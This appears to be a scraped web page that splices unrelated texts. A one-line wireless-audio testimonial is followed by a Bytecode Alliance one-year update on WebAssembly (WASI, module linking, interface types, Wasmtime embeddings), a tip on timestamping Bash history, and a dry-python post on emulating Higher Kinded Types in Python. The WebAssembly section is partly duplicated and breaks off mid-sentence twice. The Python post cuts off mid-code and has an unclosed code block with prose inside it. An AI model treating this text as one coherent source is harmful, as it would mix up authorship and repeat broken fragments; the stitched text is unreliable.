					<p>I've used this little beauty for the last couple of weeks now and I love it! I can finally enjoy wireless audio like everyone else, but without the security mess that comes with Bluetooth.</p>

    <p>We announced the Bytecode Alliance nearly a year ago, and since then it has been… quite a year 😬</p>

<p>While the 2020-ness of this year has slowed us down on some fronts, we’ve also made a lot of progress on others.</p>

<p>Now that we’ve adjusted to the new normal, we’re gearing up to accelerate on <em>all</em> fronts. But before we do that, we wanted to share some highlights of what we’ve achieved to date.</p>

<h2 id="progress-on-the-nanoprocess-model">Progress on the nanoprocess model</h2>

<p>Our goal is to evolve WebAssembly from a compilation target that you compile monolithic applications <em>to</em>, to a modular ecosystem that you compose applications <em>from</em>.</p>

<p>As we do this, we have a chance to fix many longstanding problems with the way software is developed. For example, we can make it much safer for your application to use dependencies that you didn’t code yourself.</p>

<p>This is why the <a href="https://hacks.mozilla.org/2019/11/announcing-the-bytecode-alliance/">nanoprocess model</a> is so important. It’s the paradigm shift necessary to empower developers to defend themselves against these problems.</p>

<p>There are three core pieces of the nanoprocess model that are still in progress:</p>
<ul>
  <li>WASI, the WebAssembly System Interface</li>
  <li>Module linking</li>
  <li>Interface types</li>
</ul>

<p>You can think of WASI as the way that the host and a WebAssembly module talk to each other.</p>

<p>You can think of module linking as the way that two WebAssembly modules talk to each other.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/nanoprocess-wasi-module-linking.png" alt="On the left, a WebAssembly module and host talking to each other using WASI. On the right, two WebAssembly modules talking to each other using module linking."></p>

<p>In both of these cases, the two sides are often written in different source languages. This means they might represent values and handles to resources in different ways. Basically, they speak foreign languages.</p>

<p>Interface types are like a foreign-language dictionary that the engine uses to help them communicate.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/nanoprocess-interface-types.png" alt="On both sides, the engine helps the two talk to each other using interface types."></p>

<p>Let’s see where the work on these stands today.</p>

<p><em>Note: The Bytecode Alliance doesn’t host specifications. While BA members are driving specs mentioned below, they are doing that in collaboration with others in the W3C WebAssembly CG. Bytecode Alliance projects include implementations of these specs.</em></p>

<h3 id="wasi-the-webassembly-system-interface">WASI, the WebAssembly System Interface</h3>

<p>When we introduced WASI, we compared it to <a href="https://en.wikipedia.org/wiki/POSIX">POSIX</a> and other system interfaces. That was a bit of an oversimplification, though.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasi-low-level.png" alt="A file directory structure on the left, with a protective barrier in the middle containing the operating system kernel, and an application knocking for access on the right"></p>

<p>While WASI does aim to provide a set of standardized modules that provide these low-level system interface operations, we also intend to standardize modules for specialized higher-level host APIs.</p>

<p>We’ve made progress on both of these fronts.</p>

<h4 id="low-level-system-interface-level">Low-level system interface level</h4>
<p>For the low-level system interface level, the work has been focused on quality of implementation.</p>

<p>On the spec side, that has been identifying and addressing problems with cross-platform implementability of the spec. One example of this is the <a href="https://github.com/WebAssembly/WASI/pull/312"><code>wasi-socket</code></a> API (which was <a href="https://radu-matei.com/blog/towards-sockets-networking-wasi/">recently prototyped in Wasmtime</a>). In this case, the conversation has centered on the right way to apply capabilities-based security to the handling of sockets.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/portability.png" alt="A .wasm file running across three different operating systems"></p>

<p>On the implementation side, we’ve done a lot of work to improve the security and reliability of our implementation. Part of this has been developing robust fuzzing measures (which we describe more below).</p>

<p>Another thing we’ve done is factored out the security-critical operations into a dedicated library, <a href="https://github.com/bytecodealliance/cap-std"><code>cap-std</code></a>. It’s a cross-platform library which provides much of the functionality of Rust’s standard library in a capabilities-oriented way. This allows us to fully focus on getting those security-critical foundations right on all platforms. As a next step, we’ll make use of <code>cap-std</code> in our WASI implementation.</p>

<h4 id="specialized-higher-level-host-apis">Specialized higher-level host APIs</h4>
<p>For the specialized higher-level host APIs, there has been exciting work on proposals for completely new API modules.</p>

<p>One great example of this is <a href="https://github.com/WebAssembly/wasi-nn"><code>wasi-nn</code></a>, which is a <a href="https://www.youtube.com/watch?v=6O44X76rgIg">standardized interface for neural networking</a>. This is useful because trained machine learning models are typically deployed on a variety of different devices with different architectures and operating systems. Using <code>wasi-nn</code>, the <code>.wasm</code> file can do things like describe tensors and execute inference requests in a portable way, regardless of the underlying ISA and OS.</p>

<p>We’re implementing all of these in Wasmtime as they develop. That way, people can try them out and real world usage can inform the specification.</p>

<h3 id="module-linking">Module linking</h3>

<p>If we’re going to have an ecosystem of reusable code, we need a good way to link modules together.</p>

<p>Right now, you can link modules together using host APIs. For example, on the web you can string together a bunch of <code>WebAssembly.instantiate</code> calls to link a set of modules together. In Wasmtime, you use the <a href="https://bytecodealliance.github.io/wasmtime/examples-c-linking.html">linker APIs</a>.</p>

<p>But there are a few downsides to this imperative style, including the fact that it’s fairly cumbersome, not that fast and requires the host to include some type of garbage or cycle collector.</p>

<p>With the module linking proposal, linking becomes declarative. This means that it’s much easier to use. It also means that even at compile time, the engine has all of the information about how modules are connected to each other. This opens up lots of potential optimizations and features and removes the possibility of cycles.</p>

<p>For now, we’re focusing on load-time linking, which will enable modules to factor out common library code. And for that, the proposal is pretty much complete. Longer term, we’ll be able to add run-time dynamic linking as well.</p>

<p>Our next step is to finish a prototype implementation, which should be complete within the next few months.</p>

<h3 id="interface-types">Interface types</h3>

<p>The <a href="https://github.com/WebAssembly/interface-types">Interface Types proposal</a> is evolving nicely.</p>

<p>Interface Types can now talk about a rich set of values. The design is also more efficient now, removing the need for an intermediate copy of values in almost all cases.</p>

<p>So what’s left to do in the short term?</p>

<p>While Interface Types can talk about values, they can’t yet talk about <a href="https://github.com/WebAssembly/interface-types/issues/87">handles to resources</a> and <a href="https://github.com/WebAssembly/interface-types/issues/68">buffers</a>. Both are important to support WASI and other APIs, because things like files should use handles, and it should be possible to read a file and write directly into a buffer.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/interface-types.png" alt="On the left, types that are done, including strings, numbers, references, booleans, enums, objects, and unions. On the right, types left to be done: handles and buffers."></p>

<p>Once those features are in place, Interface Types will have everything it needs to support both WASI and Module Linking, making it possible for them to talk about values and resources in a source-language independent way. So we’ll continue working on the spec in the W3C.</p>

<p>On the implementation, we’ve set the stage to execute quickly. We’ve already implemented the new features in Wasm core which Interface Types depend on, such as <a href="https://bytecodealliance.org/articles/bytecodealliance.org/articles/reference-types-in-wasmtime">Reference Types</a>, <a href="https://bytecodealliance.org/articles/multi-value-all-the-wasm">multi-value</a>, and <a href="https://github.com/bytecodealliance/wasmtime/pull/2263">multi-memory support</a>.</p>

<p>We’re also working on tools for using Interface Types. Currently, people can use <a href="https://github.com/rustwasm/wasm-bindgen"><code>wasm-bindgen</code></a> to create bindings for JS code. In the coming year, we’ll add direct support for Interface Types to language toolchains, <a href="https://github.com/bytecodealliance/wasm-interface-types">starting with Rust</a>.</p>

<p>We expect to complete most of this work within the next six months.</p>

<p>In the meantime, for people wanting to get things done today but in a forward compatible way, you can define your interface using <a href="https://github.com/WebAssembly/WASI/blob/master/docs/witx.md">WITX</a>. You can learn more about how to do this from <a href="https://www.youtube.com/watch?v=LCA9NnH7DxE">this presentation</a> by Pat Hickey, or <a href="https://radu-matei.com/blog/wasm-api-witx/">this blog post</a> from Radu Matei.</p>

<h2 id="supporting-more-languages">Supporting more languages</h2>

<p>To bring the nanoprocess model to as many people as possible, we need to integrate with as many languages as possible.</p>

<h3 id="more-languages-compiling-into-the-webassembly-nanoprocess-model">More languages compiling into the WebAssembly nanoprocess model</h3>

<p>If you want to produce code that uses the nanoprocess model, you need a compiler that:</p>
<ol>
  <li>can target WebAssembly, and</li>
  <li>has support for these cutting edge standards</li>
</ol>

<p>To help language communities speed up their adoption, we’ve started building out <a href="https://github.com/bytecodealliance/wasm-tools"><code>wasm-tools</code></a>. This is a standard set of tools that other compilers can use to target WebAssembly.</p>

<p>These are all tools that we use in Wasmtime, so as new WebAssembly features come online, they are supported here. For example, we’ve already started building support for module-linking into these tools.</p>

<p>The tools currently include:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmparser"><code>wasmparser</code></a>, which is a parser for WebAssembly files. It’s quite cheap because it doesn’t do any extra allocations, and can parse in a streaming fashion.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmprinter"><code>wasmprinter</code></a>, which translates a .wasm binary format into the .wat text format, which is useful for debugging and testing.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wat"><code>wat</code></a> and <a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wast"><code>wast</code></a>, which translate the .wat and .wast text formats into the binary format, which is useful for running tests (since it’s easier to maintain tests in the text format).</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasm-smith"><code>wasm-smith</code></a>, which is a <a href="https://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html">test case generator</a>. It generates pseudo-random Wasm modules, guaranteed to be valid Wasm modules, which we use for fuzzing.</li>
</ul>

<p>We will be adding more tools over the next year. For example, we will host the language-independent parts of the <a href="https://github.com/bytecodealliance/wasm-interface-types">Rust Interface Types toolkit</a> in <code>wasm-tools</code>, which will make it easier for languages that compile to WebAssembly to start supporting Interface Types. We also plan to collaborate with language communities on integrating these tools as they come online.</p>

<h3 id="more-languages-embedding-webassembly-via-wasmtime">More languages embedding WebAssembly via Wasmtime</h3>

<p>If you have a whole WebAssembly application, you can run that directly in a runtime like Wasmtime. But sometimes, you just want to run a little bit of WebAssembly in your project.</p>

<p>For example, you might be writing some Python code, but want to do some intensive computations. Python may be too slow, and native extensions may be too frustrating to use portably, so you could use a WebAssembly module instead.</p>

<p>Wasmtime is enabling this for many languages, through embeddings into the language runtimes.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasmtime-embedding.png" alt="&quot;Wasmtime in the center, with arrows pointing to logos for all of the languages listed below&quot;"></p>

<p>These languages now have support for running WebAssembly in Wasmtime:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasmtime-py">Python</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-go">Go</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-dotnet">.NET</a></li>
  <li>Java (two options: <a href="https://github.com/kawamuray/wasmtime-java">kawamuray/wasmtime-java</a> or <a href="https://github.com/bluejekyll/wasmtime-java">bluejekyll/wasmtime-java</a>)</li>
  <li><a href="https://metacpan.org/pod/Wasm">Perl</a></li>
  <li><a href="https://bytecodealliance.github.io/wasmtime/lang-rust.html">Rust</a></li>
  <li><a href="https://github.com/kubkon/wasmtime-zig">Zig</a></li>
  <li><a href="https://github.com/dtcristo/wasmtime-ruby">Ruby</a></li>
</ul>

<p>As new nanoprocess features come online, they get added to Wasmtime. We don’t consider feature development complete until the feature is exposed in the language embeddings that we maintain. That means that these languages can run the most cutting-edge WebAssembly modules as soon as possible.</p>

<p>It also means that these language communities don’t have to come up with their own ways of doing linking and binding. They can just depend on the WebAssembly standards, which makes everything more interoperable.</p>

<p>In the last year, we’ve transitioned the embeddings we maintain to …</p></div></div>

<p>With the module linking proposal, linking becomes declarative. This means that it’s much easier to use. It also means that even at compile time, the engine has all of the information about how modules are connected to each other. This opens up lots of potential optimizations and features and removes the possibility of cycles.</p>

<p>For now, we’re focusing on load-time linking, which will enable modules to factor out common library code. And for that, the proposal is pretty much complete. Longer term, we’ll be able to add run-time dynamic linking as well.</p>

<p>Our next step is to finish a prototype implementation, which should be complete within the next few months.</p>

<h3 id="interface-types">Interface types</h3>

<p>The <a href="https://github.com/WebAssembly/interface-types">Interface Types proposal</a> is evolving nicely.</p>

<p>Interface Types can now talk about a rich set of values. The design is also more efficient now, removing the need for an intermediate copy of values in almost all cases.</p>

<p>So what’s left to do in the short term?</p>

<p>While Interface Types can talk about values, they can’t yet talk about <a href="https://github.com/WebAssembly/interface-types/issues/87">handles to resources</a> and <a href="https://github.com/WebAssembly/interface-types/issues/68">buffers</a>. Both are important to support WASI and other APIs, because things like files should use handles, and it should be possible to read a file and write directly into a buffer.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/interface-types.png" alt="On the left, types that are done, including strings, numbers, references, booleans, enums, objects, and unions. On the right, types left to be done: handles and buffers."></p>

<p>Once those features are in place, Interface Types will have everything it needs to support both WASI and Module Linking, making it possible for them to talk about values and resources in a source-language independent way. So we’ll continue working on the spec in the W3C.</p>

<p>On the implementation, we’ve set the stage to execute quickly. We’ve already implemented the new features in Wasm core which Interface Types depend on, such as <a href="https://bytecodealliance.org/articles/bytecodealliance.org/articles/reference-types-in-wasmtime">Reference Types</a>, <a href="https://bytecodealliance.org/articles/multi-value-all-the-wasm">multi-value</a>, and <a href="https://github.com/bytecodealliance/wasmtime/pull/2263">multi-memory support</a>.</p>

<p>We’re also working on tools for using Interface Types. Currently, people can use <a href="https://github.com/rustwasm/wasm-bindgen"><code>wasm-bindgen</code></a> to create bindings for JS code. In the coming year, we’ll add direct support for Interface Types to language toolchains, <a href="https://github.com/bytecodealliance/wasm-interface-types">starting with Rust</a>.</p>

<p>We expect to complete most of this work within the next six months.</p>

<p>In the meantime, for people wanting to get things done today but in a forward compatible way, you can define your interface using <a href="https://github.com/WebAssembly/WASI/blob/master/docs/witx.md">WITX</a>. You can learn more about how to do this from <a href="https://www.youtube.com/watch?v=LCA9NnH7DxE">this presentation</a> by Pat Hickey, or <a href="https://radu-matei.com/blog/wasm-api-witx/">this blog post</a> from Radu Matei.</p>

<h2 id="supporting-more-languages">Supporting more languages</h2>

<p>To bring the nanoprocess model to as many people as possible, we need to integrate with as many languages as possible.</p>

<h3 id="more-languages-compiling-into-the-webassembly-nanoprocess-model">More languages compiling into the WebAssembly nanoprocess model</h3>

<p>If you want to produce code that uses the nanoprocess model, you need a compiler that:</p>
<ol>
  <li>can target WebAssembly, and</li>
  <li>has support for these cutting edge standards</li>
</ol>

<p>To help language communities speed up their adoption, we’ve started building out <a href="https://github.com/bytecodealliance/wasm-tools"><code>wasm-tools</code></a>. This is a standard set of tools that other compilers can use to target WebAssembly.</p>

<p>These are all tools that we use in Wasmtime, so as new WebAssembly features come online, they are supported here. For example, we’ve already started building support for module-linking into these tools.</p>

<p>The tools currently include:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmparser"><code>wasmparser</code></a>, which is a parser for WebAssembly files. It’s quite cheap because it doesn’t do any extra allocations, and can parse in a streaming fashion.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmprinter"><code>wasmprinter</code></a>, which translates a .wasm binary format into the .wat text format, which is useful for debugging and testing.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wat"><code>wat</code></a> and <a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wast"><code>wast</code></a>, which translate the .wat and .wast text formats into the binary format, which is useful for running tests (since it’s easier to maintain tests in the text format).</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasm-smith"><code>wasm-smith</code></a>, which is a <a href="https://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html">test case generator</a>. It generates pseudo-random Wasm modules, guaranteed to be valid Wasm modules, which we use for fuzzing.</li>
</ul>

<p>We will be adding more tools over the next year. For example, we will host the language-independent parts of the <a href="https://github.com/bytecodealliance/wasm-interface-types">Rust Interface Types toolkit</a> in <code>wasm-tools</code>, which will make it easier for languages that compile to WebAssembly to start supporting Interface Types. We also plan to collaborate with language communities on integrating these tools as they come online.</p>

<h3 id="more-languages-embedding-webassembly-via-wasmtime">More languages embedding WebAssembly via Wasmtime</h3>

<p>If you have a whole WebAssembly application, you can run that directly in a runtime like Wasmtime. But sometimes, you just want to run a little bit of WebAssembly in your project.</p>

<p>For example, you might be writing some Python code, but want to do some intensive computations. Python may be too slow, and native extensions may be too frustrating to use portably, so you could use a WebAssembly module instead.</p>

<p>Wasmtime is enabling this for many languages, through embeddings into the language runtimes.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasmtime-embedding.png" alt="&quot;Wasmtime in the center, with arrows pointing to logos for all of the languages listed below&quot;"></p>

<p>These languages now have support for running WebAssembly in Wasmtime:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasmtime-py">Python</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-go">Go</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-dotnet">.NET</a></li>
  <li>Java (two options: <a href="https://github.com/kawamuray/wasmtime-java">kawamuray/wasmtime-java</a> or <a href="https://github.com/bluejekyll/wasmtime-java">bluejekyll/wasmtime-java</a>)</li>
  <li><a href="https://metacpan.org/pod/Wasm">Perl</a></li>
  <li><a href="https://bytecodealliance.github.io/wasmtime/lang-rust.html">Rust</a></li>
  <li><a href="https://github.com/kubkon/wasmtime-zig">Zig</a></li>
  <li><a href="https://github.com/dtcristo/wasmtime-ruby">Ruby</a></li>
</ul>

<p>As new nanoprocess features come online, they get added to Wasmtime. We don’t consider feature development complete until the feature is exposed in the language embeddings that we maintain. That means that these languages can run the most cutting-edge WebAssembly modules as soon as possible.</p>

<p>It also means that these language communities don’t have to come up with their own ways of doing linking and binding. They can just depend on the WebAssembly standards, which makes everything more interoperable.</p>

<p>In the last year, we’ve transitioned the embeddings we maintain to …</p></div></div>

<p>If you work with a production environment you <strong>need</strong> to be recording
timestamps in your shell history. When shit hits the fan, knowing <strong>exactly</strong>
when you ran that deploy script or updated that database can help you resolve an
incident quicker.</p>

<p>After an outage, timestamped shell history can be used to stitch together
<a href="https://archive.is/ZHW2i#timelinea-screenplay-of-the-incident-use-the-incident-timeline-from-the-incident-management-document-to-start-filling-in-the-postmortems-timeline-then-supplement-with-other-relevant-entries-pWsQSj2">an accurate timeline of events</a>
for an incident report or postmortem.
<a href="https://archive.is/a0YTc">Your company does write these, right</a>?</p>

<p>It’s so easy to record timestamps to your shell history, there’s no excuse for
not having it. Here’s how you would configure it in Bash.</p>

<div><div><pre><code><span># .bashrc</span>
<span>export </span><span>HISTTIMEFORMAT</span><span>=</span><span>'%FT%T%z: '</span> <span>#  YYYY-MM-DDTHH:MM:SS±0000</span>
</code></pre></div></div>

<p>Easy as that!</p>

<p>It is also useful in other situations: Read a bunch of emails and forgot how
long ago you started your load test? Want to know what you were doing at 3 pm
yesterday? Just check your shell history.</p>

<p><code>dry-python/returns@0.15</code> is <a href="https://github.com/dry-python/returns/releases/tag/0.15.0">released</a>! And it means that now anyone can use our Higher Kinded Types emulation in their projects.</p>

<p>In this post I will explain:</p>
<ul>
  <li>What Higher Kinded Types (HKTs) are and why they are useful</li>
  <li>How they are implemented and what limitations there are</li>
  <li>How can you use them in your own projects</li>
</ul>

<p>Without further ado, let’s talk about typing!</p>


      <h2 id="simple-types">
        
        <a href="#simple-types">Simple types</a>
        
      </h2>

<p>Typing is layered. Like a good cake. There are at least three layers that we are going to cover.</p>

<p>Simple (or flat) typing, like <code>x: int = 1</code>. This allows us to express simple types and their transformations. Like <code>int -&gt; str</code>:</p>

<div><div><pre><code><span>def</span> <span>stringify</span><span>(</span><span>arg</span><span>:</span> <span>int</span><span>)</span> <span>-&gt;</span> <span>str</span><span>:</span>
    <span>return</span> <span>str</span><span>(</span><span>arg</span><span>)</span>
</code></pre></div></div>

<p>A lot of languages like <code>go</code> and <code>php</code> do not go beyond this line. And they still work pretty well! These types are also sometimes called <code>*</code>-kinded. It can be understood as “a place for just a single type argument”.</p>


    
      <h2 id="generic">
        
        <a href="#generic">Generic</a>
        
      </h2>

<p>Generic level is required to express “nested” types. For example, you have a list of integers. In Python we annotate it as <code>List[int]</code> or <a href="https://www.python.org/dev/peps/pep-0585/"><code>list[int]</code></a> in Python <code>3.9</code>. This allows us to have types with other types as arguments. <code>List</code> can receive <code>int</code> or <code>str</code> or even another <code>List</code> as the type argument. This way we can nest type and types start to have their own structure.</p>

<p>Generics are much more interesting than simple types. And they can have multiple type arguments:</p>
<ul>
  <li>List has one: for values, so it has a kind of <code>* -&gt; *</code>. It can be understood as a type transformation <code>List -&gt; T = List[T]</code></li>
  <li>Dict has two: for keys and values, so it has a kind of <code>* -&gt; * -&gt; *</code>. It can be understood as a type transformation <code>Dict -&gt; K -&gt; V = Dict[K, V]</code></li>
  <li>And so on!</li>
</ul>

<p>This would be very helpful for us in the future, I promise.</p>

<p>We can also write transformations for generic types:</p>

<div><div><pre><code><span>def</span> <span>stringify_list_items</span><span>(</span><span>arg</span><span>:</span> <span>List</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>List</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>[</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>]</span>
</code></pre></div></div>

<p>But, that is where things begin to be quite complicated.</p>

<p>How can this function work with other iterables like <code>set</code>, <code>frozenset</code>, <code>tuple</code>?
We can express this in Python as easy as:</p>

<div><div><pre><code><span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>):</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>But the typing part would be quite challenging. Let’s try several things.</p>


    
      <h3 id="common-interface">
        
        <a href="#common-interface">Common interface</a>
        
      </h3>

<p>The first obvious thing to try is <code>Iterable</code> protocol. It is builtin into Python and does what we need.</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Iterable</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>Iterable</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>Iterable</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>Let’s try it out:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]))</span>
<span># Revealed type is 'typing.Iterable[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>}))</span>
<span>#  Revealed type is 'typing.Iterable[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>((</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)))</span>
<span>#  Revealed type is 'typing.Iterable[builtins.str]'
</span></code></pre></div></div>

<p>You can see that a part of our typing information is lost. We pass <code>List</code> or <code>Set</code> or <code>Tuple</code> and always get the <code>Iterable</code> back.</p>

<p>Sometimes - this is ok. But, in some cases, this is not enough. Let’s try some other technique!</p>


    
      <h3 id="methods">
        
        <a href="#methods">Methods</a>
        
      </h3>

<p>One can say: we are all using Object-Oriented Programming! Why cannot we just create a new method for each type we need? And specify the exact return type there!</p>

<p>Well, it is a possible solution. But, there are some reasonable problems:</p>

<ul>
  <li>You cannot add methods to existing types and extend them with this approach. Only create new ones, probably via subtyping, and add new methods there. In our example you would have to create your own versions of <code>List</code>, <code>Set</code>, and <code>Tuple</code>. Which is not desirable in most situations</li>
  <li>It really it starts to be messy if you have a lot of methods to add. A type with more than <code>X</code> (choose the number yourself) methods starts to be really complex to read, understand, and use. Instead, using separate functions is much easier, because we don’t have to put everything into a single namespace</li>
</ul>

<p>Let’s try something else.</p>


    
      <h3 id="overloads">
        
        <a href="#overloads">overloads</a>
        
      </h3>

<p>Another solution that might solve our problem is using the <code>@overload</code> decorator with proper types for each required case.</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>List</span><span>,</span> <span>Set</span><span>,</span> <span>overload</span>

<span>@</span><span>overload</span>
<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>List</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>List</span><span>[</span><span>str</span><span>]:</span>
    <span>...</span>

<span>@</span><span>overload</span>
<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>Set</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>Set</span><span>[</span><span>str</span><span>]:</span>
    <span>...</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>):</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>Let’s test it:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>]))</span>
<span># Revealed type is 'builtins.list[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>}))</span>
<span># Revealed type is 'builtins.set[builtins.str]'
</span></code></pre></div></div>

<p>Awesome! Looks like we’ve achieved our goal, haven’t we? But, there’s a new problem. We have to manually list all possible cases in a function’s signature. This works for cases when all possible arguments and outcomes are known in advance. But, not in this case. In Python <code>Iterable</code> is a protocol. We can use this function with any type with <code>__iter__</code> method defined: with both builtin and custom types. So, the number of possible arguments and outcomes is endless.</p>

<p>To illusrate the problem, let’s see what happens for <code>Tuple</code> which is not listed in the function’s overloads:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>((</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)))</span>
<span># error: No overload variant of "stringify_iterable_items" matches argument type "Tuple[int, int, int]"
</span></code></pre></div></div>

<p>We, in <code>dry-python</code> <a href="https://github.com/dry-python/returns/blob/0.14.0/returns/_generated/converters/flatten.pyi">used this technique</a> with <code>@overload</code> decorator for our previous versions. This allowed us to write correct definitions of functions working with generic types. But, they were limited to the pre-defined set of our own types. And we wanted to allow our users to create their custom types based on our interfaces. With the full existing code reuse.</p>


    
      <h2 id="higher-kinded-types">
        
        <a href="#higher-kinded-types">Higher Kinded Types</a>
        
      </h2>

<p>That’s where the idea of Higher Kinded Types becomes useful. We need HKTs when we want to change the inner structure of generics with full type information preserving and openness to the extension. In theory, you can write something like:</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Iterable</span>

<span>T</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'T'</span><span>,</span> <span>bound</span><span>=</span><span>Iterable</span><span>)</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>T</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>T</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>And this would solve our problem! What happens here is that we abstract away the <code>Iterable</code> type itself. And then ask <code>mypy</code> to figure this out for us.</p>

<p>This way we can potentially have <code>stringify_iterable_items</code> working for any <code>Iterable</code> type, but with the exact same type returned back without any information lost. And it would work for all types.</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>]))</span>

<p>Unfortunately, <a href="https://github.com/python/typing/issues/548">it is not supported</a> at the moment.</p>


    
      <h3 id="emulation">
        
        <a href="#emulation">Emulation</a>
        
      </h3>

<p>Turns out we are not alone in this situation. There are multiple languages where Higher Kinded Types are not natively supported yet. But, they can be emulated:</p>

<ul>
  <li><a href="https://github.com/gcanti/fp-ts/blob/master/docs/guides/HKT.md">TypeScript</a></li>
  <li><a href="https://bow-swift.io/docs/fp-concepts/higher-kinded-types/">Swift</a></li>
  <li><a href="https://arrow-kt.io/docs/0.10/patterns/glossary/#higher-kinds">Kotlin</a></li>
</ul>

<p>And now with <a href="https://returns.readthedocs.io/en/latest/pages/hkt.html">Python</a> too!</p>

<p>There’s also <a href="https://www.cl.cam.ac.uk/~jdy22/papers/lightweight-higher-kinded-polymorphism.pdf">an original whitepaper</a> for ones who are interested.</p>

<p>The core idea of HKT emulation is that we can write types the other way around: not like <code>T[int]</code>, but rather like <code>Kind[T, int]</code> (which is absolutely the same thing).</p>

<p>This way we can transform the inner structure of generics, but maintain the simple context without reinventing <code>TypeVar</code> with type arguments. And our function’s type signature will look like: <code>Kind[T, int] -&gt; Kind[T, str]</code>.</p>

<p>Let’s see the implementation.</p>


    
      <h2 id="implementation">
        
        <a href="#implementation">Implementation</a>
        
      </h2>

<p><strong>TLDR</strong>: here’s <a href="https://gist.github.com/sobolevn/7f8ffd885aec70e55dd47928a1fb3e61">the final working code</a> with all the logic, all the hacks, and everything. In this article, we going to write and explain it step by step.</p>

<p>We would need a better example to test our implementation. Let’s build two types: a <code>Box</code> and a <code>Bag</code>. <code>Box</code> is defined by its size, while a <code>Bag</code> is an item of fashion: it has a brand name and a model name (I have a wife, I know this stuff!).</p>

<div><div><pre><code><span>from</span> <span>dataclasses</span> <span>import</span> <span>dataclass</span>
<span>from</span> <span>typing</span> <span>import</span> <span>Callable</span><span>,</span> <span>Generic</span><span>,</span> <span>TypeVar</span>

<span>_ValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_ValueType'</span><span>)</span>
<span>_NewValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_NewValueType'</span><span>)</span>

<span>@</span><span>dataclass</span>
<span>class</span> <span>Box</span><span>(</span><span>Generic</span><span>[</span><span>_ValueType</span><span>]):</span>
